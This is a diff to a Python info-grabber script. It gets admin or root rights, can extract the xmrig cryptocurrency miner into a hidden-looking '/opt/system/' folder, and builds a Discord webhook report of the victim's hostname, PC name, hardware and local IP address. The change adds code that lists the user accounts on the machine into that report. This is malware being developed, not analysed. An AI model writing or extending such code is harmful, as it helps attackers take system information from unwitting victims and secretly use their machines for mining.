@@ -1,4 +1,4 @@
-import ctypes, sys, platform
+import ctypes, sys, platform, os
 if platform.system() == "Windows":
     import ctypes
     def is_admin():
@@ -17,7 +17,6 @@ else:
         pass
     else:
         sys.exit("Rerun with Sudo or Root")
-import os
 import grabber_utils.cosita_toolkit as ctkit
 import discord_webhook
 import json
@@ -75,7 +74,11 @@ if config["MINER"] == True:
     else:
         os.mkdir("/opt/system/")
         extract_files(["xmrig"], "/opt/system/")
-
+def allusers():
+    if platform.system() == "Windows":
+        os.listdir("/Users")
+    else:
+        os.listdir("/home")
 # webhook
 embedcont = f'''
 ---------------------
@@ -86,6 +89,7 @@ Architecture --- >> {platform.machine()}
 OS.name -------- >> {os.name}
 HostName ------- >> {hostname}
 pc name -------- >> {pcname}
+All users ------ >> {allusers()}
 Proccessor ----- >> {platform.processor()}
 RAM ------------ >> {str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"}
 local Ip Address >> {localIPAddr}
